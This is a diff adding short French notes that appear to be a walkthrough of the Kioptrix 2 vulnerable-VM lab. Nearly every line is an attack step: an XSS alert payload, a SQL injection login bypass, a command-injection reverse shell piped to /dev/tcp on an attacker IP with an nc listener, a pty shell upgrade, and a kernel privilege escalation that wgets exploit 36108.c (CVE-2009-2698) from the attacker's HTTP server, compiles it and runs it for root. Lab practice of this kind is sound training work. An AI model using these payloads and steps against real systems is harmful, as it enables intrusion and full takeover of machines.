@@ -1,0 +1,35 @@
+Kioptrix 2
+
+xss 
+
+<script>alert('XSS');</script>
+
+
+sql injection
+username : admin
+mdp : ' OR '1'='1
+
+reverse shell 
+
+nc -nlvp 4444 ( sur machine kali ) 
+
+| bash -i >& /dev/tcp/192.168.179.13/4444 0>&1 (sur machine à attaquer) 
+
+python -c 'import pty;pty.spawn("/bin/bash")' stty raw -echo  ( pour amiliorer le shell) 
+
+
+
+privesc 
+uname -r Pour vérifiez si des vulnérabilités connues existent pour cette version du kernel.
+
+CVE-2009-2698
+
+python3 -m http.server 8080 ( serveur python a ouvrir sur la kali)
+
+wget http://192.168.179.6:8080/36108.c ( sur le reverseshell)
+
+gcc -o 36108 36108.c
+
+./36108
+
+et voilà root
